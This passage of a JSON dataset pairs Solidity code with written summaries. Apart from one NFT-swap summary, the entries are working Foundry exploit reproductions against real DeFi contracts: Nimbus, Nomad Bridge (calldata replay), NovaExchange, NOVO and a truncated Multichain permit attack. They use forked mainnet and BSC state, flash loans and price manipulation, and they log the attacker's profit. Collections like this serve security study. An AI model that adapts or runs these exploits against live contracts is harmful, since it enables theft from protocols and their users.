        "summary": "This code defines a smart contract called NFTSwap that handles the buying and selling of non-fungible tokens (NFTs). It imports interfaces for the ERC721 standard and defines a struct called Order which contains the owner's address and the price of the NFT. The contract has four functions: list, purchase, revoke, and update. \n\nThe list function allows the owner of the NFT to set a price and list it for sale by transferring it to the smart contract. The purchase function allows someone to purchase an NFT listed by another user by sending the correct amount of ETH to the contract. The revoke function allows the owner of the NFT to remove it from the sale list and take it back. The update function allows the owner of the NFT to update the price of the NFT. \n\nThe contract also emits four different events: List, Purchase, Revoke and Update, which allows the transactions to be traced on the blockchain. The contract also implements the onERC721Received function from the ERC721 standard, allowing it to receive ERC721 tokens.",
        "id": "2b5296f8-f072-4c4f-922e-395264037759"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ninterface IERC20Custom {\n    function transfer(address, uint) external;\n}\n\n/*\n    Vulnerable contract: https://etherscan.io/token/0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1#code\n\n    root cause: inconsistent value in the code, 10000 vs 1000.\n    // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n    uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(15));\n    uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(15));\n    require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'Nimbus: K');\n\n\n*/\ncontract ContractTest is DSTest {\n\n  address public pair = 0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1;\n  address public usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"mainnet\", 13225516); //fork bsc at block 13225516\n    \n  }\n\n  function testExploit() public {\n    console.log(\"Before exploiting\",IERC20(usdt).balanceOf(address(this)));\n\n    uint256 amount = IERC20(usdt).balanceOf(pair) * 99 / 100;\n    IUniswapV2Pair(pair).swap(amount, 0, address(this), abi.encodePacked(amount));\n\n    console.log(\"After exploiting\",IERC20(usdt).balanceOf(address(this)));\n  }\n\n  function NimbusCall(address sender, uint amount0, uint amount1, bytes calldata data) external {\n\n    IERC20Custom(usdt).transfer(pair, amount0/10 );\n\n    }\n}\n",
        "summary": "This is a Solidity smart contract that performs a test of a vulnerability in another contract (the \"Vulnerable contract\" specified in the comments). It imports an interface, sets up a testing environment, defines a function to exploit the vulnerability, and defines a function to handle an external call (which is invoked by the vulnerable contract). The vulnerability appears to involve inconsistent values in a calculation, leading to unexpected behavior.",
        "id": "998c8445-c349-41b7-941e-e1fa7fb2d9a9"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1602877048124735489\n// @TX\n// https://bscscan.com/tx/0x7d2d8d2cda2d81529e0e0af90c4bfb39b6e74fa363c60b031d719dd9d153b012\n// https://bscscan.com/tx/0x42f56d3e86fb47e1edffa59222b33b73e7407d4b5bb05e23b83cb1771790f6c1\n\ninterface NimbusBNB is IERC20{\n    function deposit() payable external;\n    function withdraw(uint256 wad) external;\n}\n\ninterface StakingRewardFixedAPY is IERC20{\n    function stake(uint256 amount) external;\n    function getReward() external;\n    function withdraw() external;\n    function earned(address account) view external returns(uint);\n} \n\ninterface LockStakingRewardFixedAPY{\n    function stake(uint256 amount) external;\n    function getReward() external;\n    function earned(address account) view external returns(uint);\n}\n\ncontract ContractTest is Test{\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IERC20 GNIMB = IERC20(0x99C486b908434Ae4adF567e9990A929854d0c955);\n    IERC20 NIMB = IERC20(0xCb492C701F7fe71bC9C4B703b84B0Da933fF26bB);\n    NimbusBNB NBU_WBNB = NimbusBNB(0xA2CA18FC541B7B101c64E64bBc2834B05066248b);\n    Uni_Router_V2 NimbusRouter = Uni_Router_V2(0x2C6cF65f3cD32a9Be1822855AbF2321F6F8f6b24);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0xaCAac9311b0096E04Dfe96b6D87dec867d3883Dc);\n    StakingRewardFixedAPY stakingReward1 = StakingRewardFixedAPY(0x3aA2B9de4ce397d93E11699C3f07B769b210bBD5);\n    LockStakingRewardFixedAPY stakingReward2 = LockStakingRewardFixedAPY(0x706065716569f20971F9CF8c66D092824c284584);\n    LockStakingRewardFixedAPY stakingReward3 = LockStakingRewardFixedAPY(0xdEF57A7722D4411726ff40700Eb7b6876BEE7ECB);\n    address dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;\n    uint flashLoanAmount;\n    uint flashSwapAmount;\n    User1 public user1;\n    User2 public user2;\n    User3 public user3;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 23639507);\n    }\n\n    function testExploit() public{\n        user1 = new User1();\n        user2 = new User2();\n        user3 = new User3();\n        NBU_WBNB.deposit{value: 20 ether}();\n        NBU_WBNB.transfer(address(user1), 16 ether);\n        NBU_WBNB.transfer(address(user2), 2 ether);\n        NBU_WBNB.transfer(address(user3), 2 ether);\n        user1.stake();\n        user2.stake();\n        user3.stake();\n        cheats.warp(block.timestamp + 8 * 24 * 60 * 60);\n        flashLoanAmount = WBNB.balanceOf(dodo);\n        DVM(dodo).flashLoan(flashLoanAmount, 0, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\"Attacker WBNB balance after exploit\", WBNB.balanceOf(address(this)), WBNB.decimals());\n    }\n\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{\n        flashSwapAmount = WBNB.balanceOf(address(Pair)) - 1e18;\n        Pair.swap(flashSwapAmount, 0, address(this), new bytes(1));\n        WBNB.transfer(dodo, flashLoanAmount);\n    }\n\n    function BiswapCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{\n        payable(address(0)).transfer(address(this).balance);\n        WBNB.withdraw(WBNB.balanceOf(address(this)));\n        NBU_WBNB.deposit{value: address(this).balance}();\n        NBU_WBNB.approve(address(NimbusRouter), type(uint).max);\n        address[] memory path = new address[](2);\n        path[0] = address(NBU_WBNB);\n        path[1] = address(NIMB);\n        NimbusRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            NBU_WBNB.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        ); // Reward Price Manipulation\n        user1.getReward();\n        // GNIMB.transfer(address(stakingReward1), stakingReward1.balanceOf(address(user1)) - GNIMB.balanceOf(address(stakingReward1)));\n        // user1.withdraw();\n        GNIMB.transfer(address(stakingReward2), stakingReward2.earned(address(user2)) - GNIMB.balanceOf(address(stakingReward2)));\n        user2.getReward();\n        GNIMB.transfer(address(stakingReward3), stakingReward3.earned(address(user3)) - GNIMB.balanceOf(address(stakingReward3)));\n        user3.getReward();\n        NIMB.approve(address(NimbusRouter), type(uint).max);\n        path[0] = address(NIMB);\n        path[1] = address(NBU_WBNB);\n        NimbusRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            NIMB.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n        GNIMBToNBU_WBNB();\n        NBU_WBNB.withdraw(NBU_WBNB.balanceOf(address(this)));\n        address(WBNB).call{value: address(this).balance}(\"\");\n        WBNB.transfer(address(Pair), flashSwapAmount * 1000 / 998 + 1000);\n    }\n\n    function GNIMBToNBU_WBNB() internal{\n        GNIMB.approve(address(NimbusRouter), type(uint).max);\n        address[] memory path = new address[](2);\n        path[0] = address(GNIMB);\n        path[1] = address(NBU_WBNB);\n        NimbusRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            GNIMB.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    receive() payable external{}\n\n}\n\ncontract User1 is Test{\n    address Owner;\n    IERC20 GNIMB = IERC20(0x99C486b908434Ae4adF567e9990A929854d0c955);\n    NimbusBNB NBU_WBNB = NimbusBNB(0xA2CA18FC541B7B101c64E64bBc2834B05066248b);\n    Uni_Router_V2 NimbusRouter = Uni_Router_V2(0x2C6cF65f3cD32a9Be1822855AbF2321F6F8f6b24);\n    StakingRewardFixedAPY stakingReward1 = StakingRewardFixedAPY(0x3aA2B9de4ce397d93E11699C3f07B769b210bBD5);\n\n    constructor(){\n        Owner = msg.sender;\n    }\n\n    function stake() external{\n        NBU_WBNB.approve(address(NimbusRouter), type(uint).max);\n        address[] memory path = new address[](2);\n        path[0] = address(NBU_WBNB);\n        path[1] = address(GNIMB);\n        NimbusRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            NBU_WBNB.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n        GNIMB.approve(address(stakingReward1), type(uint).max);\n        stakingReward1.stake(GNIMB.balanceOf(address(this)));\n    }\n\n    function getReward() external{\n        deal(address(GNIMB), address(stakingReward1), 13_855_114 * 1e18);\n        stakingReward1.getReward();\n        GNIMB.transfer(Owner, GNIMB.balanceOf(address(this)));\n    }\n\n    // function withdraw() external{\n    //     stakingReward1.withdraw();\n    //     GNIMB.transfer(Owner, GNIMB.balanceOf(address(this)));\n    // }\n}\n\ncontract User2{\n    address Owner;\n    IERC20 GNIMB = IERC20(0x99C486b908434Ae4adF567e9990A929854d0c955);\n    NimbusBNB NBU_WBNB = NimbusBNB(0xA2CA18FC541B7B101c64E64bBc2834B05066248b);\n    Uni_Router_V2 NimbusRouter = Uni_Router_V2(0x2C6cF65f3cD32a9Be1822855AbF2321F6F8f6b24);\n    LockStakingRewardFixedAPY stakingReward2 = LockStakingRewardFixedAPY(0x706065716569f20971F9CF8c66D092824c284584);\n\n    constructor(){\n        Owner = msg.sender;\n    }\n\n    function stake() external{\n        NBU_WBNB.approve(address(NimbusRouter), type(uint).max);\n        address[] memory path = new address[](2);\n        path[0] = address(NBU_WBNB);\n        path[1] = address(GNIMB);\n        NimbusRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            NBU_WBNB.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n        GNIMB.approve(address(stakingReward2), type(uint).max);\n        stakingReward2.stake(GNIMB.balanceOf(address(this)));\n    }\n\n    function getReward() external{\n        stakingReward2.getReward();\n        GNIMB.transfer(Owner, GNIMB.balanceOf(address(this)));\n    }\n}\n\ncontract User3{\n    address Owner;\n    IERC20 GNIMB = IERC20(0x99C486b908434Ae4adF567e9990A929854d0c955);\n    NimbusBNB NBU_WBNB = NimbusBNB(0xA2CA18FC541B7B101c64E64bBc2834B05066248b);\n    Uni_Router_V2 NimbusRouter = Uni_Router_V2(0x2C6cF65f3cD32a9Be1822855AbF2321F6F8f6b24);\n    LockStakingRewardFixedAPY stakingReward3 = LockStakingRewardFixedAPY(0xdEF57A7722D4411726ff40700Eb7b6876BEE7ECB);\n\n    constructor(){\n        Owner = msg.sender;\n    }\n\n    function stake() external{\n        NBU_WBNB.approve(address(NimbusRouter), type(uint).max);\n        address[] memory path = new address[](2);\n        path[0] = address(NBU_WBNB);\n        path[1] = address(GNIMB);\n        NimbusRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            NBU_WBNB.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n        GNIMB.approve(address(stakingReward3), type(uint).max);\n        stakingReward3.stake(GNIMB.balanceOf(address(this)));\n    }\n\n    function getReward() external{\n        stakingReward3.getReward();\n        GNIMB.transfer(Owner, GNIMB.balanceOf(address(this)));\n    }\n}",
        "summary": "This code defines a Solidity contract that exploits a vulnerability in a blockchain protocol called Nimbus. The contract interacts with various other contracts, including Dodo Exchange, Biswap, and several staking contracts, to carry out the exploit. The exploit involves manipulating the price of a reward token and withdrawing a large amount of it from the staking contracts. The contract also performs flash loans and swaps tokens to carry out the attack.",
        "id": "d6073f65-38a5-4bfe-899f-7ecdb9b0006e"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @KeyInfo - Total Lost : ~152M US$\n// Attacker(s) : \u2620\ud83d\ude08\ud83d\udc7d\ud83e\udd16\ud83d\udc35\ud83c\udf1d\ud83e\udd37\u200d\u2642\ufe0f\n// Replica contract mistakenly initialize : 0x53fd92771d2084a9bf39a6477015ef53b7f116c79d98a21be723d06d79024cad\n// Example TXs in this reproduce\n//  Attacker send 0.01 WBTC to NomadBridge : 0xed26708a7335116bdb0673f32ace7c2f329fe3cd349e200447210f1721f335f0\n//  NomadBridge Process 100 WBTC to Attacker : 0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460\n\n// @Info\n// Nomad BridgeRouter Contract : https://etherscan.io/address/0x88a69b4e698a4b090df6cf5bd7b2d47325ad30a3#code (Proxy)\n// Nomad BridgeRouter Contract : https://etherscan.io/address/0x15fda9f60310d09fea54e3c99d1197dff5107248#code (Logic)\n// Nomad Replica Contract : https://etherscan.io/address/0x5d94309e5a0090b165fa4181519701637b6daeba#code (Proxy)\n// Nomad Replica Contract : https://etherscan.io/address/0xb92336759618f55bd0f8313bd843604592e27bd8#code (Logic) (Vulnerable!!)\n// WBTC Contract : https://etherscan.io/token/0x2260fac5e5542a773aa44fbcfedf7c193bc2c599#code\n// NomadBridge Audit Report : https://github.com/nomad-xyz/docs/blob/1ff0c55dba2a842c811468c57793ff9a6542ef0f/docs/public/Nomad-Audit.pdf (QSP-19 Proving With An Empty Leaf)\n\n// @Analysis\n// samczsun : https://twitter.com/samczsun/status/1554252024723546112\n// ParadigmEng420 : https://twitter.com/paradigmeng420/status/1554249610574450688\n// 0xfoobar : https://twitter.com/0xfoobar/status/1554269062653411334\n// CertiK : https://twitter.com/CertiKAlert/status/1554305088037978113\n// Beosin : https://twitter.com/BeosinAlert/status/1554303803218083842\n// Blocksec : https://twitter.com/BlockSecTeam/status/1554335271964987395\n// CertiK post-mortem : https://www.certik.com/resources/blog/28fMavD63CpZJOKOjb9DX3-nomad-bridge-exploit-incident-analysis\n\nCheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\nIReplica constant Replica = IReplica(0x5D94309E5a0090b165FA4181519701637B6DAEBA);\nIERC20 constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);\n\ncontract Attacker is Test {\n    function setUp() public {\n        cheat.createSelectFork(\"mainnet\", 15259100);\n        cheat.label(address(Replica), \"Replica\");\n        cheat.label(address(WBTC), \"WBTC\");\n    }\n\n    function testExploit() public {\n        console.log(\"Attackers can copy the original user's transaction calldata and replacing the receive address with a personal one.\");\n        console.log(\"We mock how attackers/whitehats replay the calldata at block 15259100\\n\");    // Txhash : 0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460\n\n        emit log_named_decimal_uint(\"Attacker WBTC Balance\", WBTC.balanceOf(address(this)), 8);\n        console.log(\"Attacker claim 100 WBTC from NomadBridge...\");\n        \n        // Copy inputdata in txhash(0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460), but replacing receive address\n        bytes memory msgP1 = hex\"6265616d000000000000000000000000d3dfd3ede74e0dcebc1aa685e151332857efce2d000013d60065746800000000000000000000000088a69b4e698a4b090df6cf5bd7b2d47325ad30a3006574680000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c59903000000000000000000000000\";\n        bytes memory recvAddr = abi.encodePacked(address(this));\n        bytes memory msgP2 = hex\"00000000000000000000000000000000000000000000000000000002540be400e6e85ded018819209cfb948d074cb65de145734b5b0852e4a5db25cac2b8c39a\";\n        bytes memory _message = bytes.concat(msgP1, recvAddr, msgP2);\n\n        // This is _message data structure :\n        /*\n            bytes memory chainId = \"beam\";   // hex(6265616d) == dec(1650811245), Ref: https://docs.nomad.xyz/developers/environments/domain-chain-ids\n            bytes memory sender = hex\"D3dfD3eDe74E0DCEBC1AA685e151332857efCe2d\";\n            bytes memory nonce = hex\"13d6\";         // == dec\"5078\"\n            bytes memory localDomain = hex\"657468\"; // == str\"eth\"\n            bytes memory recipientAddress = hex\"88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3\";    // BridgeRouter address. this will callback BridgeRouter.handle(_message)\n             ------------ __message that call BridgeRouter.handle(__message) ------------\n            uint32 _domain = 657468;    // == str(\"eth\")\n            bytes32 _id = abi.encodePacked(address(WBTC));\n            bytes32 _to = abi.encodePacked(address(this));\n            uint256 _amnt = 100 * 1e8; // 100 WBTC\n            bytes32 _detailsHash = keccak256(abi.encodePacked(bytes(\"Wrapped BTC\").length, \"Wrapped BTC\", bytes(\"WBTC\").length, \"WBTC\", uint8(8)));        \n            bytes29 _tokenId = BridgeMessage.formatTokenId(_domain, _id);\n            bytes29 _action = BridgeMessage.formatTransfer(_to, _amnt, _detailsHash);\n            bytes memory __message = BridgeMessage.formatMessage(_tokenId, _action);\n            -----------------------------------------------------------------------------\n            bytes memory _message = bytes.concat(chainId, sender, nonce, localDomain, recipientAddress, __message);\n        */\n\n\n        bool suc = Replica.process(_message);\n        require(suc, \"Exploit failed\");\n\n        emit log_named_decimal_uint(\"Attacker WBTC Balance\", WBTC.balanceOf(address(this)), 8);\n    }\n}\n\ninterface IReplica {\n    function process(bytes memory _message) external returns (bool _success);\n}\n",
        "summary": "This code is a Solidity smart contract that defines an attacker that can exploit a vulnerability in the Nomad BridgeRouter Contract. The contract sets up some constants and imports some interfaces required for the attack, and defines a function `testExploit()` that exploits the vulnerability by copying the calldata of a previous transaction involving the NomadBridge contract, and replacing the receive address with the attacker's own address. The attack allows the attacker to claim 100 WBTC tokens from the NomadBridge contract. The code also provides some links to resources related to the incident, including analysis and audit reports.",
        "id": "932cbcfc-0d12-4198-bee9-dbf214b7e10c"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BeosinAlert/status/1601168659585454081\n// @TX\n// https://bscscan.com/tx/0xf743dba906255cf6f75f8243ef8192f2a211aacf03df99322584686b5c445c23\n// forge test --contracts ./src/test/NovaExchange_exp.sol -vv\n\ninterface INovaExchange {\n    function rewardHolders(uint256 amount) external;\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function approve(address spender, uint value) external returns (bool);\n}\n\ncontract ContractTest is DSTest {\n\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n  INovaExchange novaContract = INovaExchange(0xB5B27564D05Db32CF4F25813D35b6E6de9210941);\n  address attacker = 0xCBF184b8156e1271449CFb42A7D0556A8DCFEf72;\n  IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n\n  IPancakeRouter wbnb_nova =  IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)); // wbnb/nova Pair\n    \n  function setUp() public {\n    cheats.createSelectFork(\"bsc\", 23749678); //fork bsc at block number 23749678\n\n    //novaContract.approve(address(wbnb_nova), type(uint256).max);\n    //WBNB.approve(address(wbnb_nova), type(uint256).max);\n  }\n\n  function testExploit() public {\n        \n        emit log_named_uint(\n          \"Before exploit, NOVA balance of attacker:\",\n          novaContract.balanceOf(attacker)\n        );\n\n        cheats.prank(attacker);\n\n        novaContract.rewardHolders(10000000000000000000000000000);\n        \n        emit log_named_uint(\n          \"After exploit,  NOVA balance of attacker:\",\n          novaContract.balanceOf(attacker)\n        );\n\n        // address[] memory path2 = new address[](2);\n        // path2[0] = address(novaContract);\n        // path2[1] = address(WBNB);\n\n        //I see [FAIL. Reason: Pancake: INSUFFICIENT_INPUT_AMOUNT] testExploit() (gas: 124976)\n        //I am pretty sure the error has to do with the number of decimals of the NOVA token\n        //Not sure how to fix it\n        // wbnb_nova.swapExactTokensForETH(\n        //     10000000000020000000000000000,\n        //     361966603954705498098,\n        //     path2,\n        //     attacker,\n        //     1670570010\n        // );\n  }\n\n  receive() external payable {}\n\n}\n",
        "summary": "This code defines a Solidity smart contract to test and exploit a vulnerability in the NovaExchange contract on the Binance Smart Chain (BSC) blockchain. The contract imports a testing library, an interface to the NovaExchange contract, an interface to the WBNB token contract, and the PancakeSwap router. It also defines a cheatCodes contract, sets a BSC fork, and the attacker's address. The `testExploit()` function executes a prank function in the cheatCodes contract, then uses the `rewardHolders()` function in the NovaExchange contract to deposit a large amount of NOVA tokens in the attacker's account. Finally, the contract tries to swap the NOVA tokens for WBNB through PancakeSwap, but this functionality seems to be incomplete and untested.",
        "id": "17eb4b21-063b-41ad-986d-ca0ec41904f6"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// Exploit Alert ref: https://www.panewslab.com/zh_hk/articledetails/f40t9xb4.html\n// Origin Attack Transaction: 0xc346adf14e5082e6df5aeae650f3d7f606d7e08247c2b856510766b4dfcdc57f\n// Blocksec Txinfo: https://versatile.blocksecteam.com/tx/bsc/0xc346adf14e5082e6df5aeae650f3d7f606d7e08247c2b856510766b4dfcdc57f\n\n// Attack Addr: 0x31a7cc04987520cefacd46f734943a105b29186e\n// Attack Contract: 0x3463a663de4ccc59c8b21190f81027096f18cf2a\n\n// Vulnerable Contract: https://bscscan.com/address/0xa0787daad6062349f63b7c228cbfd5d8a3db08f1#code\n\ninterface INOVOLP {\n  function sync() external;\n}\n\ncontract ContractTest is DSTest {\n  IPancakePair PancakePair =\n    IPancakePair(0xEeBc161437FA948AAb99383142564160c92D2974);\n  IPancakeRouter PancakeRouter =\n    IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));\n  IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));\n  INOVO novo = INOVO(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333);\n  INOVOLP novoLP = INOVOLP(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D);\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"bsc\", 18225002); //fork bsc at block number 18225002\n  }\n\n  function testExploit() public {\n    wbnb.deposit{ value: 10 * 1e18 }();\n    emit log_named_decimal_uint(\n      \"[Start] Attacker WBNB balance before exploit\",\n      wbnb.balanceOf(address(this)),\n      18\n    );\n\n    // Brrow 17.2 WBNB\n    bytes memory data = abi.encode(\n      0xEeBc161437FA948AAb99383142564160c92D2974,\n      172 * 1e17\n    );\n    PancakePair.swap(0, 172 * 1e17, address(this), data);\n\n    emit log_named_decimal_uint(\n      \"[End] After repay, WBNB balance of attacker\",\n      wbnb.balanceOf(address(this)),\n      18\n    );\n  }\n\n  function pancakeCall(\n    address sender,\n    uint256 amount0,\n    uint256 amount1,\n    bytes calldata data\n  ) public {\n    // \u653b\u64ca\u8005\u5148\u8cb7\u5165 NOVO Token\n    // \u900f\u904e NOVO Token \u7684 transferFrom \u672a\u904e\u6ffe `from`\n    // `from` \u6307\u5b9a\u70ba NOVO/WBNB \u7684 LP pool, \u5373\u53ef\u64cd\u7e31 PancakeSwap NOVO/WBNB \u7684\u50f9\u683c\n    // \u653b\u64ca\u8005\u518d\u8ce3\u51fa flashswap \u501f\u4f86\u7684 NOVO Token \u5373\u53ef\u7372\u5229\n\n    address[] memory path = new address[](2);\n\n    emit log_named_decimal_uint(\n      \"[*] Attacker flashswap Borrow WBNB\",\n      amount1,\n      18\n    );\n\n    // Use borrow WBNB to swap some NOVO token\n    emit log_string(\"[*] Attacker going swap some NOVO...\");\n    wbnb.approve(address(PancakeRouter), type(uint256).max);\n    path[0] = address(wbnb);\n    path[1] = address(novo);\n    PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n      172 * 1e17,\n      1,\n      path,\n      address(this),\n      block.timestamp\n    ); // get 4,749,070,146,640,911 NOVO Token\n    require(novo.balanceOf(address(this)) != 0, \"Swap Failed\");\n\n    // Sync NOVO token balance before exploit\n    emit log_named_decimal_uint(\n      \"\\t[INFO] Attacker NOVO balance\",\n      novo.balanceOf(address(this)),\n      9\n    );\n    emit log_named_decimal_uint(\n      \"\\t[INFO] PancakeSwap NOVO/WBNB LP balance\",\n      novo.balanceOf(address(novoLP)),\n      9\n    );\n\n    // Manipulate the LP of NOVO/WBNB => Manipulate the NOVO/WBNB price\n    emit log_string(\"[E] Attacker going manipulate NOVO/WBNB LP...\");\n    novo.transferFrom(address(novoLP), address(novo), 113951614762384370); // 113,951,614.76238437 NOVO Token\n    emit log_named_decimal_uint(\n      \"\\t[INFO] PancakeSwap NOVO/WBNB LP balance\",\n      novo.balanceOf(address(novoLP)),\n      9\n    );\n\n    // Sync NOVO/WBNB price\n    novoLP.sync();\n\n    // Swap NOVO to WBNB, make attacker profit\n    emit log_string(\"[*] Attacker going swap some WBNB...\");\n    novo.approve(address(PancakePair), novo.balanceOf(address(this)));\n    path[0] = address(novo);\n    path[1] = address(wbnb);\n    PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n      novo.balanceOf(address(this)),\n      1,\n      path,\n      address(this),\n      block.timestamp\n    );\n    require(wbnb.balanceOf(address(this)) > 172 * 1e17, \"Exploit Failed\");\n\n    // Payback the flashswap, will be `BorrowAmount` + 0.25% fee\n    require(\n      wbnb.transfer(address(PancakePair), amount1 + 4472 * 10e13),\n      \"Payback Failed\"\n    );\n  }\n\n  receive() external payable {}\n}\n",
        "summary": "This code is a Solidity smart contract that executes an exploit on a vulnerable contract on the Binance Smart Chain. The exploit involves manipulating the price of the NOVO/WBNB token pair on the PancakeSwap decentralized exchange by transferring NOVO tokens from the LP pool without filtering the \"from\" address. By manipulating the token price, the attacker can make a profit by swapping NOVO tokens for WBNB tokens. The code uses the PancakeSwap router and interfaces for the NOVO/WBNB LP pool and the NOVO token. The code also includes logging statements to provide information about the state of the exploit during execution.",
        "id": "279bf374-5035-48b1-925f-7ec95e5df067"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ninterface IERC20Custom {\n    function transfer(address, uint) external;\n}\n\n/*\n    Vulnerable contract: https://etherscan.io/address/0xa14660a33cc608b902f5bb49c8213bd4c8a4f4ca#code unverified contract\n    root cause: inconsistent value in the code, 10000 vs 1000.\n    Attacker contract: 0x5676e585bf16387bc159fd4f82416434cda5f1a3\n*/\ncontract ContractTest is DSTest {\n\n  address public pair = 0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62; //NWETH/NBU\n  address public nbu = 0xEB58343b36C7528F23CAAe63a150240241310049;\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"mainnet\", 13225516); //fork bsc at block 13225516\n    \n  }\n\n  function testExploit() public {\n    console.log(\"Before exploiting\",IERC20(nbu).balanceOf(address(this)));\n\n    uint256 amount = IERC20(nbu).balanceOf(pair) * 99 / 100;\n\n    IUniswapV2Pair(pair).swap(0, amount, address(this), abi.encodePacked(amount));\n\n    console.log(\"After exploiting\",IERC20(nbu).balanceOf(address(this)));\n  }\n\n  fallback() external {\n\n    IERC20Custom(nbu).transfer(pair, IERC20(nbu).balanceOf(address(this))/10 );\n\n    }\n}",
        "summary": "This code is a Solidity smart contract that tests a known vulnerability in another smart contract. It imports the \"forge-std/Test.sol\" library for unit testing, and also imports an interface for a custom ERC20 token contract. The \"setUp\" function sets up a fork of the Binance Smart Chain at a specific block number, and the \"testExploit\" function exploits a specific vulnerability in an unverified vulnerable smart contract. The \"fallback\" function is called when ether is sent to the contract, and it transfer tokens to the vulnerable smart contract address. Upon completing the test, the contract outputs the balance of the ERC20 tokens before and after exploiting the vulnerability.",
        "id": "0f6159bd-99ee-4e26-b9a5-4c5cabd06729"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1595346020237352960\n// @TX\n// https://etherscan.io/tx/0x8a8145ab28b5d2a2e61d74c02c12350731f479b3175893de2014124f998bff32\n\ninterface MultichainRouter{\n    function anySwapOutUnderlyingWithPermit(\n        address from,\n        address token,\n        address to,\n        uint amount,\n        uint deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s,\n        uint toChainID\n    ) external;\n}\n\ncontract ContractTest is DSTest{\n    IERC20 NUM = IERC20(0x3496B523e5C00a4b4150D6721320CdDb234c3079);\n    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    MultichainRouter multichainRouter = MultichainRouter(0x765277EebeCA2e31912C9946eAe1021199B39C61);\n    Uni_Router_V3 Router = Uni_Router_V3(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45);\n    address victimAddress = 0x78AC2624a2Cd193E8dEfE9F39A9528e8bd4a368c;\n    uint NUMBalance;\n\n    CheatCodes cheats = 